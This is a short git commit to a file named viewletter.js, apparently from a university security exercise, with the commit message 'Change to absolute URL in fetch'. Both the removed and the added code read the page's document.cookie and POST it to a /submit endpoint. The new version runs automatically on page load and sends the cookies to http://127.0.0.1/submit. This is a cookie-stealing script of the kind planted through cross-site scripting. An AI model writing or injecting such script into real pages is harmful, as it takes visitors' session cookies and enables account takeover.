aa93b75e6e97c235d7cc214e587907a198e274d2
LaurinTUHH <49526183+LaurinTUHH@users.noreply.github.com>
2022-04-26 12:26:51 +0200

    Change to absolute URL in fetch

--- viewletter.js
+++ viewletter.js
@@ -1,7 +1,9 @@
-fetch("/submit", {
-  method: "POST",
-  headers: {'Content-Type': 'application/json'}, 
-  body: JSON.stringify({"message": document.cookie})
-}).then(res => {
-  console.log("Request complete! response:", res);
-});
+document.addEventListener('DOMContentLoaded', () => {
+  fetch("http://127.0.0.1/submit", {
+    method: "POST",
+    headers: {'Content-Type': 'application/json', 'Content-Length': '82'}, 
+    body: JSON.stringify({"message": document.cookie})
+  }).then(res => {
+    console.log("Request complete! response:", res);
+  });
+})
